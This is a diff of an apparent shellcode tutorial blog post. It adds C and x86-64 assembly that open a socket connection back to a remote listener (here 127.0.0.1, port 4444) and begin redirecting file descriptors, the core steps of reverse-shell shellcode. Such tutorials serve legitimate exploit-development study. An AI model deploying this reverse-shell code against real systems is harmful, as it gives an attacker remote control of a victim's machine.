@@ -197,6 +197,18 @@ syscall //Give the syscall instruction
 
 Again, if the block of code above makes no sense to you then go and read the previous blogposts first.
 
+<h3>Initiate the connection back to remote server</h3>
+
+```c
+server.sin_family = AF_INET; //Address Family
+server.sin_port = htons(atoi(arguments[2])); //Network Byte order of the port to bind to. 
+                                             //htons converts host byte order to network byte order
+server.sin_addr.s_addr = inet_addr(arguments[3]); //Our remote IP Address defined in the variables (in this case localhost)
+bzero(&server.sin_zero, 8); // 8 zero bytes of padding
+
+connect(sock, (struct sockaddr *)&server, sockaddr_len);
+```
+
 ```nasm
 
         mov rdi, rax
@@ -204,19 +216,20 @@ Again, if the block of code above makes no sense to you then go and read the pre
         xor rax, rax
 
         push rax
-        ; change IP as reverse hex as needed
-        mov dword [rsp-4], 0x7b01a8c0
+        
+        mov dword [rsp-4], 0x7f000001
         mov word [rsp-6], 0x5c11
         mov word [rsp-8], 0x2
         sub rsp, 8
-
-
-        ;connect(sock, (struct sockaddr *)&server, sockaddr_len)
         
         mov rax, 42
         mov rsi, rsp
         mov rdx, 16
         syscall
+        
+```
+
+```nasm
 
         mov rax, 33
         mov rsi, 0
